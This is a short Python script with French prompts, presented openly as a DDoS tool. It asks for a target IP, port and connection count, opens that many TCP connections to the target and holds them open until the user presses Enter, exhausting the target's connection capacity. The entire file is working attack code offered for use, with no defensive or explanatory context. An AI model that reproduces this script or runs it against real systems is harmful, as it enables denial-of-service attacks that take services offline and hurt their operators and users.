import socket
import time
import os

target_ip_ddos = input("Entrez une IP : ")
target_port_ddos = int(input("Entrez un port : "))
num_connections = int(input("Entrez un nombre de connexions : "))

def start_flood():
    print(f"Attacking {target_ip_ddos}:{target_port_ddos} with {num_connections} connections...")
    sockets = []
    
    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip_ddos, target_port_ddos))
            sockets.append(s)
            if i % 100 == 0:
                print(f"Connected: {i}/{num_connections}")
        except Exception as e:
            print(f"Erreur connexion {i}: {e}")
            break
            
    print(f"Flood en cours. {len(sockets)} connexions ouvertes.")
    input("Appuyez sur Entrée pour arrêter et fermer les sockets...")
    
    for s in sockets:
        try:
            s.close()
        except:
            pass
    print("Flood terminé.")

if __name__ == "__main__":
    start_flood()